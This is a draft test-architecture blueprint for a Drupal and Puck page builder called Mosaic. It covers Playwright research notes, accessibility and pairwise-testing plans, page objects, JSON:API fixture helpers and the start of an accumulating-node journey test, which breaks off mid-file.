# Mosaic — Test Architecture Blueprint

> **Status:** `PENDING ARUN APPROVAL` — do not build, commit, or push until this file
> is approved. After approval this becomes a second binding bible (same read-only-after-approval
> rule as the working agreement). Governed by `AI/Mosaic-test-architecture-directive.md`.
>
> **Owner:** Arun Karthick · **Authored:** 2026-07-10
> **Sources:** §7 research mandate (all findings below), roadmap EPIC T (J1–J10), directive §4
> **Commitment:** zero sleeps, strict TS, oracle rule, findings log, six-hat notes throughout.

---

## TABLE OF CONTENTS

1. [Research Digest](#1-research-digest)
2. [Full Test Architecture](#2-full-test-architecture)
3. [Coverage Matrix with Counts](#3-coverage-matrix-with-counts)
4. [Fixture Library Spec](#4-fixture-library-spec)
5. [Sprint / Story Breakdown](#5-sprint--story-breakdown)
6. [Run-Tier Strategy](#6-run-tier-strategy)
7. [Promotion Register](#7-promotion-register)
8. [Findings Log](#8-findings-log)
9. [Old Suite Disposition](#9-old-suite-disposition)
10. [Six Hats Notes](#10-six-hats-notes)
11. [Honesty Ledger](#11-honesty-ledger)
12. [Commit Packages](#12-commit-packages)

---

## 1. Research Digest

All findings below are cited to verified live sources. Items marked `UNVERIFIED` were not
confirmable from a live source during research — they are flagged for manual verification
before the cited API or pattern is used in code.

### 1.1 Playwright — Verified Current State

**Source:** GitHub API `api.github.com/repos/microsoft/playwright/releases`
**Current stable: v1.61.1 (released 2026-06-23).**
Our `package.json` pins `"@playwright/test": "^1.50.0"` — this must be bumped to `^1.61.1`
before building the new suite. See FINDING-002.

Key APIs verified for this architecture:

**Aria snapshots** (v1.49, enhanced v1.59–1.60):
```typescript
// Capture accessible tree as YAML
const snapshot = await locator.ariaSnapshot();

// Assert against inline YAML
await expect(locator).toMatchAriaSnapshot(`
  - heading "Page Title" [level=1]
  - link "Learn more"
`);

// Assert against named file (.aria.yml stored alongside tests)
await expect(locator).toMatchAriaSnapshot({ name: 'header.aria.yml' });
```
These are environment-stable (no pixel rendering) — the primary structural assertion for
every component render check per §6.3.

**Test fixtures and page objects** (source: playwright.dev/docs/test-fixtures):
```typescript
// test-scoped page object fixture (for per-test node lifecycle)
export const test = base.extend<{ builderPage: BuilderPage }>({
  builderPage: async ({ page }, use) => {
    const bp = new BuilderPage(page);
    await bp.goto(process.env.DDEV_SITE_URL!);
    await use(bp);
    // teardown: nothing — deletion handled by isolation.ts trackedSave
  },
});

// worker-scoped shared node for accumulating journey
export const test = base.extend<{}, { journeyNodeId: string }>({
  journeyNodeId: [async ({ request }, use, workerInfo) => {
    // Create accumulating node via JSON:API at worker start
    const nodeId = await createJourneyNode(request, workerInfo.parallelIndex);
    await use(nodeId);
    await deleteNode(request, nodeId);
  }, { scope: 'worker' }],
});
```
Use `parallelIndex` (not `workerIndex`) — parallelIndex is stable across worker restarts.
Source: playwright.dev/docs/test-parallel

**Sharding** (source: playwright.dev/docs/test-sharding):
```bash
npx playwright test --shard=1/4   # shard index/total
```
Combine with blob reporter → `npx playwright merge-reports --reporter html ./blobs`.
Each shard runs `workers:1` (serial within shard, parallel across shards). Introduced v1.37.

**test.step with box: true** (source: playwright.dev/docs/api/class-test#test-step):
```typescript
await test.step('Fill heading text', async () => {
  await propPanel.fill('text', fixtures.heading.text);
  await expect(canvas.locator('.mosaic-heading')).toHaveText(fixtures.heading.text);
}, { box: true });  // errors point to step call site, not internals
```
Steps retry at the TEST level — the entire test reruns on retry, not individual steps.
Steps are the right structure for long journey tests; `test.describe.serial()` is NOT used
(see §1.9 Rejected Alternatives).

**Parameterized tests** (source: playwright.dev/docs/test-parameterize):
No `test.each()` or `test.for()` in Playwright. Use plain `.forEach()` over data arrays:
```typescript
Object.entries(COMPONENTS).forEach(([id, fixture]) => {
  test(`J2 component lifecycle — ${id}`, async ({ builderPage }) => { ... });
});
```
**VERIFIED** (multiple agents confirmed): `test.for()` does not appear in current Playwright
docs and does not exist in the package. `.forEach()` is the canonical Playwright pattern.

**New assertions since v1.40** (source: playwright.dev/docs/release-notes):
| Version | Addition |
|---|---|
| v1.44 | `toHaveAccessibleName()`, `toHaveAccessibleDescription()`, `toHaveRole()` |
| v1.49 | `toMatchAriaSnapshot()` |
| v1.50 | `toMatchAriaSnapshot({ name })`, `toHaveAccessibleErrorMessage()` |
| v1.52 | `toContainClass()` |

### 1.2 Drupal E2E Ecosystem

**Nightwatch status** (source: drupal.org/project/drupal/issues/3467492 — verified):
Policy decision to replace Nightwatch with Playwright was **closed as fixed October 21, 2025**.
Migration issue #3553673 is open/active — 73 tests converted, MR !14733 open, custom CI
Docker image built. Nightwatch removal planned for Drupal 12. The Drupal core Playwright
direction validates our framework choice completely.

**Drupal Experience Builder / Canvas patterns** (source: git.drupalcode.org/project/experience_builder + /canvas — verified live):
XB was renamed **Drupal Canvas**. It uses the `@lullabot/playwright-drupal` library for a
completely different isolation model: `core/scripts/test-site.php` installs a fresh Drupal
per worker, each with a unique `SIMPLETEST_USER_AGENT` cookie routing to its own DB prefix.
Login is via Drush one-time link (`drush user:login`), not storageState. Content is created
via `drush php-eval` (e.g., `Page::create([...])->save()`), not JSON:API.

**We do NOT adopt these patterns** because they target isolated installs; we test a
persistent live DDEV MariaDB site. Our `storageState` + JSON:API + per-test `trackedSave`
approach is the right model for our use case (see §1.9 Rejected Alternatives for details).

**`@drupal/playwright`** (source: git.drupalcode.org/project/playwright — verified live, launched Aug 2025):
Official Drupal.org Playwright package. Provides `parallelWorker`, `isolatedPerTest`,
`isolatedPerTestSnapshot`, and manual `Drupal.install()` fixture modes. The snapshot mode
uses git fingerprinting to cache SQLite installs — very fast for CI. Rejected for same
reason: requires fresh-install isolation; incompatible with our live-MariaDB fidelity goal.

**JSON:API for fixture CRUD** (source: drupal.org/docs/core-modules/jsonapi-module — verified):
JSON:API is in Drupal 11 core but **NOT enabled by default** (not in standard.info.yml).
Must be enabled explicitly in the QA setup script: `drush en jsonapi basic_auth`.
Write operations are disabled by default — enable via `/admin/config/services/jsonapi`.
Basic Auth bypasses CSRF check entirely. Node delete: `DELETE /jsonapi/node/{type}/{uuid}`
returns 204. Node create: `POST /jsonapi/node/{type}` returns 201 with UUID in response body.
```typescript
// In globalSetup / worker-scoped fixture
const res = await request.post(`${BASE}/jsonapi/node/mosaic_qa`, {
  headers: {
    'Content-Type': 'application/vnd.api+json',
    'Accept': 'application/vnd.api+json',
    'Authorization': 'Basic ' + Buffer.from(`${API_USER}:${API_PASS}`).toString('base64'),
  },
  data: { data: { type: 'node--mosaic_qa', attributes: { title: 'MOSAICQA-journey-p0' } } },
});
const { data } = await res.json();
const uuid = data.id;
```

### 1.3 DDEV Test Isolation

**Source:** lullabot.github.io/playwright-drupal — verified live.

The community standard for DDEV + Drupal + Playwright parallel test isolation is the
**`@lullabot/playwright-drupal` + `Lullabot/ddev-playwright` stack**:
- Mounts `/tmp/sqlite` as tmpfs (in-memory) inside the DDEV web container
- Each Playwright worker gets its own **SQLite copy** of a clean Drupal install
- No manual `workerIndex` handling — the package handles it

**Key finding — worker reuse bug** (source: drupal.org/project/canvas/issues/3554549 — verified):
Worker-scoped Drupal installs fail when Playwright reuses a worker for a different test file —
the DB state from the previous file pollutes the new file. The Drupal Canvas project confirmed
this; fix is to use **per-test isolation**, not per-worker.

**Our decision:** We already have per-test isolation via `isolation.ts` / `trackedSave()` /
`deleteNode()` from S0.3. We do NOT adopt the SQLite-per-worker stack because:
1. Our tests run against a live DDEV MariaDB site (not SQLite)
2. `trackedSave()` + `deleteNode()` via JSON:API already gives per-test isolation
3. SQLite behavior differs from MariaDB for edge cases (fulltext, collation, triggers)
**Record: SQLite-per-worker rejected** — incompatible with live-MariaDB fidelity requirement.

**Multi-database (DDEV)** (source: docs.ddev.com/en/stable/users/usage/database-management/):
DDEV supports unlimited named databases per project via `--database=NAME` flag. Possible
for test isolation via `ddev mysql -e 'CREATE DATABASE test_worker_N...'` + `TEST_WORKER_INDEX`
env var in Drupal settings. No established addon or pattern exists for this. Rejected (see §1.9).

### 1.4 CI Strategy

**Source:** playwright.dev/docs/test-sharding, playwright.dev/docs/test-projects — verified.

The run-tier strategy (§6) is built on:
1. **`--grep @smoke`** for PR gate — file-match or tag-match, community convention
2. **`--shard=N/M` + blob reporter** for nightly parallel sweep
3. **`workers:1` per shard** — stable resource usage (no concurrent Drupal sessions per shard)
4. **`fail-fast: false`** in GitHub Actions matrix — shards never cancel each other

**test.describe.serial()** is explicitly "not recommended" by Playwright docs and is also
REJECTED for the accumulating-node Master Journey — see §1.9 Rejected Alternatives for why
`expect.soft()` alone cannot solve the sweep problem, and §2.4 for the correct mechanism
(`test.describe()` + `workers: 1` + `fullyParallel: false`).

### 1.5 Puck Test Patterns

**Source:** github.com/measuredco/puck package.json — verified live.

Puck is at **v0.22.0** (released 2026-06-23). Mosaic uses 0.21.2 — one version behind.
Puck uses **Jest 29 + @testing-library/react 16 + jsdom** internally. There is **no Playwright
or E2E test suite in the Puck repository**. No published guidance exists on testing Puck-based
applications at the E2E level.

**Consequence:** Mosaic owns its own E2E drag-and-drop coverage entirely. The `page.mouse.*`
approach from Sprint 103 (B-088 fix) is the established working pattern; there is no upstream
Puck guidance to supersede it.

**Puck 0.22.0 delta** (`UNVERIFIED` — changelog not fetched during research): The jump from
0.21.2 → 0.22.0 may include breaking changes to drag API, action bar, or hotkeys. Must read
the Puck changelog before building the new suite. Logged as FINDING-003.

### 1.6 Combinatorial / NIST Pairwise Testing

**NIST research** (source: csrc.nist.gov/projects/automated-combinatorial-testing-for-software — verified live):
**ACTS 3.3** is the current version (last updated June 8, 2026). The foundational finding
(Kuhn, Wallace, Gallo 2004, IEEE Transactions on Software Engineering): "Most failures are
triggered by one or two factors interacting, with progressively fewer by three or more
factors." NIST measured a "20X to 700X reduction in test set size" vs exhaustive testing
while achieving equivalent fault detection. Specific percentages (e.g., "70% for pairwise")
are from the paper — not from the live NIST web page — cite the IEEE paper if needed.

**ACTS distribution:** Java-based tool; must email acts@nist.gov to obtain. Not suitable
for direct CI integration. We use `pict-node` instead.

**JavaScript pairwise tool — `pict-node`** (source: npmjs.com/package/pict-node + github.com/gmaxlev/pict-node — verified live):
- **Current version:** 1.3.2 (last published July 24, 2024)
- **License:** MIT. TypeScript: 83.5% of repo.
- **Wraps:** Microsoft PICT (open source, github.com/microsoft/pict)
- **`allpairs` npm:** returns 404 — does not exist. **`pairwise` npm:** is an array-pair utility, NOT a combinatorial test generator — do not use.

API (verified from README):
```typescript
import { pict } from 'pict-node';

const cases = await pict({
  model: [
    { key: 'fieldValue', values: ['valid', 'boundary', 'invalid', 'xss', 'unicode', 'maxlength'] },
    { key: 'role',       values: ['admin', 'anonymous'] },
    { key: 'fieldType',  values: ['text', 'enum', 'boolean', 'integer', 'url'] },
  ],
});
// cases: array of { fieldValue: string, role: string, fieldType: string }
```
Generates pairwise 2-way coverage: all (fieldValue × role) pairs, all (fieldValue × fieldType)
pairs, all (role × fieldType) pairs — 60–90% of typical combinatorial faults caught.

**Applied model for this project:** See Promotion Register (§7) for the specific pairs
we adopt. Per directive §5, pairwise is applied where axes share a rendering or storage
mechanism — not as a blanket cross-product.

### 1.7 Accessibility Testing

**`@axe-core/playwright`** (source: npm registry + github.com/dequelabs/axe-core-npm README — verified live):
**Current version: 4.12.1.** Bundles axe-core ~4.12.1. Peer dep: `playwright-core >= 1.0.0`.

Full verified API (all methods chain):
```typescript
import { AxeBuilder } from '@axe-core/playwright';

// Component-scoped scan with WCAG 2.1 AA + WCAG 2.2 AA rules
const results = await new AxeBuilder({ page })
  .include('[data-testid="mosaic-canvas"] .mosaic-heading')  // scope to component
  .withTags(['wcag2aa', 'wcag22aa'])    // WCAG 2.1 AA + 2.2 AA (both needed)
  .disableRules('color-contrast')        // only for tracked design-system false positives
  .analyze();
expect(results.violations).toEqual([]);

// Full-page scan
const pageResults = await new AxeBuilder({ page })
  .exclude('#toolbar-administration')   // exclude admin chrome (not Mosaic's responsibility)
  .withTags(['wcag2aa', 'wcag22aa'])
  .analyze();
```

**Critical:** `wcag22aa`-tagged rules are **disabled by default** in axe-core and will NOT
run unless you explicitly call `.withTags(['wcag22aa'])`. Always pass both `['wcag2aa', 'wcag22aa']`
to get combined WCAG 2.1 AA + 2.2 AA coverage. The `axe.run()` raw options equivalent
`runOnly: { type: 'tag', values: ['wcag22aa'] }` is handled automatically by `AxeBuilder`.

Available WCAG tags (verified from axe-core rule descriptions page):
`wcag2a`, `wcag2aa`, `wcag2aaa`, `wcag21a`, `wcag21aa`, `wcag22aa` — no `wcag22a` (only `wcag22aa`).

**WCAG 2.2 new criteria** (source: w3.org/TR/WCAG22 — verified live, published October 5, 2023):

| SC | Title | Level | Automated? |
|---|---|---|---|
| 2.4.11 | Focus Not Obscured (Min) | AA | Partial (axe) |
| 2.4.12 | Focus Not Obscured (Enhanced) | AAA | Manual |
| 2.5.7 | Dragging Movements | AA | Manual (interaction testing) |
| 2.5.8 | Target Size (Min) | AA | Partial (`wcag258` axe rule) |
| 3.2.6 | Consistent Help | A | Manual |
| 3.3.7 | Redundant Entry | A | Manual |
| 3.3.8 | Accessible Auth (Min) | AA | Partial |
| 4.1.1 | Parsing | — | **Removed** in WCAG 2.2 |

**Exact verified criterion text** (w3.org/TR/WCAG22):
- **2.5.7 Dragging Movements (AA):** "All functionality that uses dragging movements can be
  achieved by another pointer input modality."
  Mosaic violation: Puck does NOT wire `KeyboardSensor` (B-035). THIS IS AN OPEN WCAG VIOLATION — FINDING-004.
- **2.5.8 Target Size (Minimum) (AA):** "The target size for pointer inputs is at least 24 by
  24 CSS pixels" (with exceptions for inline elements and user-agent-sized controls).
- **3.2.6 Consistent Help (A):** Help mechanisms (contact details, self-help, automated contact)
  must appear in the same order when repeated across pages.

### 1.8 Section 508 / Government Standards

**Source:** access-board.gov/ict/ — verified live.

**Current US federal legal standard: WCAG 2.0 Level A and AA** (Section E205.4 of the
Revised 508 Standards, finalized January 18, 2017). The reference is specifically to
"WCAG 2.0, W3C Recommendation, December 11, 2008." **Section 508 has NOT been updated
to WCAG 2.1 or 2.2** as of the research date — no active rulemaking found.

**Practical implication:**
- Conforming to WCAG 2.2 AA also satisfies WCAG 2.0 AA (backward-compatible)
- Many agencies voluntarily target WCAG 2.1 AA as a stronger baseline
- For gov procurement checklist, "WCAG 2.2 AA" is strictly a superset of what's legally
  required — exceeding the requirement is fine; falling below WCAG 2.0 AA is a violation
- FINDING-004 (Dragging Movements, WCAG 2.5.7) is a WCAG 2.2 criterion, not a Section 508
  requirement today — but it IS required for most EU public sector digital services under
  EN 301 549 (which references WCAG 2.1). Still a real blocker for EU/enterprise adoption.

### 1.9 Rejected Alternatives

| Alternative | Reason rejected | Source |
|---|---|---|
| `test.describe.serial()` for non-journey tests | Playwright explicitly "not recommended"; use independent tests wherever possible | playwright.dev/docs/api/class-test |
| `test.describe.serial()` for the accumulating journey (J2) | Serial mode skips ALL subsequent tests after ANY test failure — including tests that fail due to `expect.soft()` assertions (soft records the failure and marks the test FAILED; serial sees the FAILED result and skips all remaining tests). This makes the hard/soft split completely ineffective: a broken render in pass 1 still skips passes 2–18. The correct mechanism is `test.describe()` + `workers: 1` + `fullyParallel: false`: tests run in declaration order on a single worker with module-scoped variables persisting across them; a failed test fails ONLY that pass — N+1..18 still run. | Confirmed Playwright behavior — `expect.soft()` records but does not suppress the FAILED status that serial mode gates on |
| Gherkin / BDD / Cucumber | Roadmap EPIC T explicit: "NO BDD/Gherkin. Plain Playwright + TypeScript." | `AI/Mosaic-enhancement-roadmap.md` |
| Cross-environment screenshot baselines | Directive §6.3: "cross-environment pixel baselines produce false failures via font rendering — do not repeat that mistake." | Directive §6.3 |
| `test.for()` / `test.each()` | Does not exist in Playwright — Jest API, not Playwright | playwright.dev/docs/api/class-test (confirmed absent) |
| OAuth Bearer for test fixture auth | Drupal core issue #3055260 (open): Bearer tokens still trigger CSRF under certain session-cookie conditions; Basic Auth is simpler and avoids the bug entirely | drupal.org/project/drupal/issues/3055260 |
| MySQL named database per worker | No established addon or reference implementation; SQLite-per-worker is community standard but incompatible with our live-MariaDB fidelity requirement | docs.ddev.com — confirmed absence of this pattern |
| `locator.dragTo()` for Puck drag | Abandoned Sprint 103 — Puck palette changed to list-based UI; dnd-kit PointerSensor not reliably triggered by `dragTo()`. `page.mouse.*` is the confirmed working mechanism | Sprint 103 / B-088 / B-036 resolution |
| SQLite-per-worker via `@lullabot/playwright-drupal` | MariaDB production fidelity; our `trackedSave()` + JSON:API `deleteNode()` already provides per-test isolation | drupal.org/project/canvas/issues/3554549 |
| `@drupal/playwright` official package | Launched August 2025 (git.drupalcode.org/project/playwright). Uses `core/scripts/test-site.php` to install a fresh Drupal per worker in SQLite — correct for testing Drupal core/contrib modules against isolated installs. We are testing a live DDEV MariaDB site, not installing fresh sites, so this package's isolation model is incompatible. | git.drupalcode.org/project/playwright README |
| XB / Canvas login pattern (drush OTL per test) | Experience Builder uses `test-site.php` + Drush one-time login URL per test — every test gets a fresh Drupal install with its own session. We use storageState (setup project pattern) because we test a persistent DDEV site where the admin session is reusable. OTL would be slower and unnecessary. | git.drupalcode.org/project/experience_builder — DrupalSite.ts fixture |
| `globalSetup` for auth (old Playwright pattern) | Playwright now recommends the "setup project with dependencies" pattern over `globalSetup`. Our `auth.setup.ts` + `projects[].dependencies: ['setup']` is already canonical. `globalSetup` still works but has no trace/report integration. | playwright.dev/docs/auth — verified June 2026 |

---

## 2. Full Test Architecture

### 2.1 Directory Layout

```
js/e2e/
├── .auth/
│   └── admin.json              # storageState from auth.setup.ts (setup project, not globalSetup)
├── fixtures/
│   ├── components.ts           # COMPONENTS map: id → field fixture values (§4)
│   ├── invalid.ts              # Invalid / attack fixture values (§4)
│   └── pairwise/
│       └── field-value-pairs.ts  # Curated pairwise pairs from Promotion Register
├── helpers/
│   ├── isolation.ts            # makeTitle(), extractNodeId(), deleteNode(), janitorSweep()
│   ├── json-api.ts             # createNode(), deleteNodeByUuid() via JSON:API + Basic Auth
│   ├── a11y.ts                 # axeCheck(page, scope?, opts?) wrapper — @axe-core/playwright v4.12.1; opts.exclude for admin toolbar
│   └── computed-style.ts       # assertColor(el, prop, expected), assertBbox(el, expected)
├── journeys/
│   ├── J1-first-contact.spec.ts
│   ├── J2-author-page.spec.ts
│   ├── J3-templates.spec.ts
│   ├── J4-live-data.spec.ts
│   ├── J5-design-tokens.spec.ts
│   ├── J6-editorial-lifecycle.spec.ts
│   ├── J7-breakpoints.spec.ts
│   ├── J8-accessibility.spec.ts
│   ├── J9-schema-migration.spec.ts
│   └── J10-adversary.spec.ts
├── pages/
│   ├── BuilderPage.ts          # existing — extend with journey methods
│   ├── FrontendPage.ts         # NEW — page-as-anonymous assertions
│   ├── NodeViewPage.ts         # existing
│   └── LoginPage.ts            # existing
├── selectors.ts                # single source of all data-testid selectors
└── [existing spec files]       # kept as regression net per §9
```

### 2.2 Page Objects

**`BuilderPage`** — extended with:
```typescript
class BuilderPage {
  // Existing: goto(), drag(), selectInCanvas(), saveNode()
  // New additions:
  async dragComponent(componentId: string): Promise<void>
  async fillAllProps(componentId: string, fields: Record<string, unknown>): Promise<void>
  async assertPreviewBehavior(componentId: string): Promise<void>
  // ↑ §6.2 PRE-SAVE CONTRACT (must be stated before tests are written):
  //   Tier B (SSR): [data-testid="mosaic-preview-state"] reaches data-state="loading"
  //                 within 2s of drag. No blank screen. No crash. Loading skeleton visible.
  //   Tier A (Twig): immediate render or empty placeholder. No blank screen. No crash.
  //   Both: full preview is NOT available before first save — this limitation is documented
  //         in the Mosaic README and is the spec. The test asserts the STATED behavior
  //         (skeleton or placeholder), not a full render.
  //   If neither skeleton nor placeholder is visible → FINDING: "pre-save preview spec gap"
  //   (the spec does not document what Tier A shows before save — log as FINDING-008).
  async saveAndPublish(): Promise<string>  // returns URL of published node
  async assertCanUndo(): Promise<void>  // polls data-testid="mosaic-can-undo"
  async attemptInvalidSave(componentId: string, invalidFixture: ComponentFixture['invalid']): Promise<void>
  async saveWasBlocked(): Promise<boolean>  // true if Drupal validation error visible
}
```

**`FrontendPage`** — NEW:
```typescript
class FrontendPage {
  async visitAsAdmin(url: string): Promise<void>
  async visitAsAnonymous(url: string, browser: Browser): Promise<void>
  // Uses browser.newContext() with no storageState — NEVER clearCookies() on the
  // admin context (page). Clearing admin cookies destroys the session for all
  // subsequent admin steps in this or future passes.
  async assertComponentRenders(componentId: string, fixture: ComponentFixture): Promise<void>
  async assertAriaStructure(componentId: string, snapshotName: string): Promise<void>
  async assertComputedStyle(selector: string, prop: string, expected: string): Promise<void>
  async assertNoHorizontalOverflow(): Promise<void>
  async assertNoConsoleErrors(): Promise<void>
  async fetchInitialHtml(url: string, anonRequest: APIRequestContext): Promise<string>  // anonymous context required — see §2.6
}
```

**`json-api.ts`** helper:
```typescript
const API_AUTH = 'Basic ' + Buffer.from(`${QA_API_USER}:${QA_API_PASS}`).toString('base64');

export async function createJourneyNode(request: APIRequestContext, workerIndex: number) {
  const res = await request.post(`${BASE}/jsonapi/node/mosaic_qa`, {
    headers: { 'Content-Type': 'application/vnd.api+json', Authorization: API_AUTH },
    data: { data: { type: 'node--mosaic_qa', attributes: {
      title: `MOSAICQA-w${workerIndex}-journey-node`,
      status: 1,
    }}},
  });
  const { data } = await res.json();
  return { nid: data.attributes.drupal_internal__nid, uuid: data.id };
}

export async function deleteNodeByUuid(request: APIRequestContext, type: string, uuid: string) {
  await request.delete(`${BASE}/jsonapi/node/${type}/${uuid}`, {
    headers: { Authorization: API_AUTH },
  });
  // 204 = success; 404 = already gone (both acceptable in teardown)
}
```

### 2.3 Auth Strategy

Existing `auth.setup.ts` + `storageState: './e2e/.auth/admin.json'` pattern is correct and
stays. The `chromium` project uses admin auth; `anonymous` project has no storageState.
No change needed for the new suite — reuse the existing projects config.

**Drupal login redirect gotcha** (source: playwright.dev/docs/auth — verified): After login,
Drupal redirects to `/user/{uid}` (a dynamic URL), not a fixed path. Use a regex:
```typescript
await page.waitForURL(/\/user\/\d+/);
```
not an exact URL. Without this, the storageState setup race can capture an incomplete session.

For JSON:API fixture operations: dedicated `mosaic_qa_api` Drupal user with
`create/delete mosaic_qa content` permissions. Credentials in `.env.e2e` (never committed).
Must be created by the QA setup script `scripts/qa/e2e-setup.sh`.

**FINDING-007 (Correction 4):** `scripts/qa/e2e-setup.sh` enables JSON:API write mode and
creates a privileged API user. It MUST have an environment guard at the top that refuses to
run outside DDEV (`IS_DDEV_PROJECT` env var check). Without this guard, accidental execution
on a staging site permanently enables a public write API. See FINDING-007 in §8 for the
exact guard code. The guard is a hard `exit 1` — not a warning, not a prompt.

### 2.4 Master Journey Structure — Accumulating Node

The directive §4 requires ONE node that grows across component passes. The container is
`test.describe()` (NOT `test.describe.serial()` — see §1.9). `retries: 0` is mandatory
(oracle rule; retries would re-add a component to a node that may already have it, corrupting state).

**Hard/soft assertion contract (the key architectural decision):**

With `workers: 1` and `fullyParallel: false`, Playwright runs tests in declaration order on a single
worker with module-scoped variables persisting across tests. A FAILED test (whether from a hard or
soft assertion) fails ONLY that test — the next test still runs. This is the fundamental difference
from `test.describe.serial()`, which would skip all remaining tests after any failure, rendering the
hard/soft split useless. The hard/soft split controls test-body behavior within each pass:

| Journey step | Mode | Rationale |
|---|---|---|
| A.1 Drag (`toHaveCount(prev+1)`) | **HARD** | Drag failure → node state unknown → continuing meaningless |
| A.2–3 Fill fields | **HARD** | Fill failure → saved data is wrong → render assertions meaningless |
| A.4 Pre-save preview behavior (§6.2 contract) | **HARD** | Asserts a spec'd builder contract; failure is a builder FINDING |
| A.5 Save + publish | **HARD** | No published URL → no verification target |
| B.6 Admin render × 3 bps (all N components) | **SOFT** | Render failures are findings; node still exists for next pass |
| B.7 Precision computed style | **SOFT** | Same |
| B.8 Twig-first HTML (all N components) | **SOFT** | Same |
| C.9–10 Anon × 3 bps (all N components) | **SOFT** | Same |
| §6.4 Axe scans | **SOFT** | A11y violations are findings; must not abort the sweep |
| D.11 Negative pass | **SOFT** | Validation/security finding; does not affect node state |

**Failure-mode contract:** If a HARD assertion fails in pass N (drag, fill, save), the test for
pass N is marked FAILED. Passes N+1..18 still run — there is NO skip cascade. `accumulatedComponents.push(componentId)`
sits at the end of each test body; if a hard step throws, `push` never executes, so C(n) is NOT
added to the regression baseline for subsequent passes (correct: we must not assert that a component
whose save failed rendered correctly). `afterAll` still runs and deletes the node. **Verify this
failure model before S1 begins:** inject a deliberate hard failure in pass 3 (e.g. bogus selector)
and confirm that passes 4–18 appeared in the report as ran/passed/failed rather than skipped.

**Component ordering:** Known-broken components go LAST to minimize skip blast from hard failures.
FINDING-005 (`mosaic_heading` renders `<div>` not `<h2>`) MUST be fixed in S0.4 before the
first full sweep run. Until fixed, `mosaic_heading` is sorted to the end of `COMPONENT_ORDER`.

```typescript
// journeys/J2-author-page.spec.ts (compile-shaped illustrative structure)
import { test, expect } from '@playwright/test';
import type { Browser } from '@playwright/test';
import { COMPONENTS } from '../fixtures/components';
import { createJourneyNode, deleteNodeByUuid } from '../helpers/json-api';
import { axeCheck } from '../helpers/a11y';
import { BuilderPage } from '../pages/BuilderPage';
import { FrontendPage } from '../pages/FrontendPage';

// SHARD LOCK: This file contains the accumulating-node Master Journey (directive §4).
// Playwright sharding is file-granular. Do NOT split this file across multiple spec files —
// doing so would break module-scoped variable sharing (accumulatedComponents, nodeUrl, nodeUuid)
// across shards and cause non-deterministic CI failures.

const BASE = process.env.PLAYWRIGHT_BASE_URL ?? 'https://drupalak.ddev.site';

// Known-broken components sorted last — hard failures in pass N still let passes N+1..18 run,
// but C(n) is excluded from the regression baseline. Sorting broken components last limits the
// number of passes with an incomplete regression set.
// FINDING-005: mosaic_heading must be fixed in S0.4 before first full sweep.
const KNOWN_BROKEN = ['mosaic_heading'];
const COMPONENT_ORDER = Object.entries(COMPONENTS).sort(([aId], [bId]) => {
  const aB = KNOWN_BROKEN.includes(aId), bB = KNOWN_BROKEN.includes(bId);
  if (aB && !bB) return 1;
  if (bB && !aB) return -1;
  return 0;
});

test.describe('J2 — Author Page: accumulating node', () => {
  let nodeUrl: string;
  let nodeUuid: string;              // assigned in beforeAll; consumed in afterAll
  const accumulatedComponents: string[] = [];

  test.beforeAll(async ({ playwright: pw }, workerInfo) => {
    // `playwright` is a worker-scoped fixture — valid in beforeAll.
    // Do NOT destructure `request` in beforeAll: it is test-scoped and unavailable.
    // `workerInfo` is the SECOND argument, NOT part of the fixtures destructure.
    const requestContext = await pw.request.newContext({ baseURL: BASE });
    const { nid, uuid } = await createJourneyNode(requestContext, workerInfo.workerIndex);
    nodeUrl  = `${BASE}/node/${nid}/edit`;
    nodeUuid = uuid;
    await requestContext.dispose();
  });

  test.afterAll(async ({ playwright: pw }) => {
    const requestContext = await pw.request.newContext({ baseURL: BASE });
    await deleteNodeByUuid(requestContext, 'mosaic_qa', nodeUuid);
    await requestContext.dispose();
  });

  for (const [componentId, fixture] of COMPONENT_ORDER) {
    test(`add ${componentId} @journey`, async ({ page, browser, playwright }) => {
      const builderPage = new BuilderPage(page);
      let publishedUrl: string;
      const prevCount = accumulatedComponents.length;

      // ── HARD assertions (plain expect) — failure aborts + skips rest ─────

      await test.step('[HARD] Open node edit form', async () => {
        await page.goto(nodeUrl);
        await expect(page.locator('[data-testid="mosaic-canvas"]')).toBeVisible();
      });

      await test.step('[HARD] Drag component onto canvas', async () => {
        await builderPage.dragComponent(componentId);
        await expect(page.locator('[data-testid="mosaic-component-count"]'))
          .toHaveAttribute('data-count', String(prevCount + 1), { timeout: 5_000 });
      });

      await test.step('[HARD] Fill every field with real values', async () => {
        await builderPage.fillAllProps(componentId, fixture.valid);
      });

      await test.step('[HARD] Pre-save preview behavior (§6.2 contract)', async () => {
        // Tier B: [data-testid="mosaic-preview-state"] reaches data-state="loading".
        // Tier A: immediate render visible in canvas.
        // Full preview before first save is SPEC'D as not available — asserted here
        // as "no crash / no blank screen," not as "full rendered preview."
        await builderPage.assertPreviewBehavior(componentId);
      });

      await test.step('[HARD] Save and publish', async () => {
        publishedUrl = await builderPage.saveAndPublish();
        // saveAndPublish() polls [data-testid="mosaic-save-state"] for data-state="saved",
        // then returns the canonical published node URL.
      });

      // ── SOFT assertions (expect.soft) — record failure, then continue ────
      // A broken render in pass 1 does NOT skip passes 2–18.

      await test.step('[SOFT] Admin view: all N components × 3 breakpoints', async () => {
        for (const bp of [{ width: 1280, height: 900 }, { width: 768, height: 1024 }, { width: 393, height: 852 }]) {
          await page.setViewportSize(bp);
          await page.goto(publishedUrl);
          expect.soft(
            await page.locator(fixture.expectedSelector).count(),
            `${componentId} visible @${bp.width}px (admin)`,
          ).toBeGreaterThan(0);
          for (const priorId of accumulatedComponents) {
            expect.soft(
              await page.locator(COMPONENTS[priorId].expectedSelector).count(),
              `${priorId} regression @${bp.width}px`,
            ).toBeGreaterThan(0);
          }
        }
      });

      await test.step('[SOFT] Precision: computed style for C(n)', async () => {
        await page.setViewportSize({ width: 1280, height: 900 });
        await page.goto(publishedUrl);
        const frontendPage = new FrontendPage(page);
        await frontendPage.assertComputedStyle(fixture.expectedSelector, fixture.style ?? {});
      });

      await test.step('[SOFT] Twig-first HTML: all N components in no-JS initial HTML', async () => {
        // Must use an anonymous request context — playwright.request inherits no session cookies.
        // NEVER use page.request here: it inherits admin cookies and returns authenticated HTML,
        // invalidating the Twig-first test (which proves anonymous SSR, not admin SSR).
        const anonReq = await playwright.request.newContext();
        const frontendPage = new FrontendPage(page);
        const html = await frontendPage.fetchInitialHtml(publishedUrl, anonReq);
        await anonReq.dispose();
        for (const id of [...accumulatedComponents, componentId]) {
          const keyText = COMPONENTS[id].valid[COMPONENTS[id].textKey ?? 'text'] as string | undefined;
          if (keyText) {
            expect.soft(html, `${id} key text in initial HTML`).toContain(keyText);
